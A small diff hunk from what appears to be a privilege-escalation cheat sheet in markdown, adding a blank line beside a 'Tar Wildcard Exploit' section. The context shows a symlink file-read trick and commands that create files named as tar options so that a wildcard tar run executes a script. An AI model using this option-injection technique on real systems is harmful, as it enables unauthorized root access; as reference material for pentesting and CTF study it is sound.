@@ -302,6 +302,7 @@ ln -s /file/you/want/to/read root.txt
   <summary><strong>Tar Wildcard Exploit</strong></summary>
 
 <img width="675" height="350" alt="image" src="https://github.com/user-attachments/assets/af27b485-c6fb-4ab7-9b35-b2e20a5f01fa" />
+
 ```bash
 echo "" > '--checkpoint=1'
 echo "" > '--checkpoint-action=exec=sh privesc.sh'
